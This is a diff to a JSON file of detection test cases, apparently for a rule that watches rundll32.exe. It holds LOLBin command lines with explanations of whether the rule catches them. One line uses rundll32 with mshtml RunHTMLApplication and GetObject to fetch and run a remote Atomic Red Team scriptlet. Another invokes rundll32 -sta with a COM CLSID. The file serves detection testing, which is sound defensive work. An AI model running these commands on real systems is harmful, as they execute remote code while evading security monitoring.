@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "\"C:\\Windows\\System32\\RUNDLL32.EXE\" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}",
@@ -31,6 +30,5 @@
   {
     "output": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
     "explanation": "This command uses rundll32.exe with an uncommon extension (none) and is not filtered by the rule. It is a valid test case and cannot be bypassed by safe mutation techniques without changing the behavior."
-  },
-  {
-    "
+  }
+]
